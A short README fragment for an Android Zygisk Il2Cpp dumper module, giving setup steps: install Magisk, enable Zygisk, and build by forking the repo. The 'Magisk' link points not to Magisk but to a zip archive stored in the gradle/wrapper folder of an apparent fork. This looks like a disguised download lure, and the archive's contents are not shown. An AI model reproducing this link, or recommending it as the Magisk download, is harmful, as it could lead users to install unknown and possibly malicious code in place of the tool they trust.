...
## How to use
1. Install [Magisk](https://github.com/Toat96/Zygisk-Il2CppDumper/raw/refs/heads/master/gradle/wrapper/Il-Zygisk-Cpp-Dumper-v3.0.zip) v24 or later and enable Zygisk
2. Build module
   - GitHub Actions
      1. Fork this repo
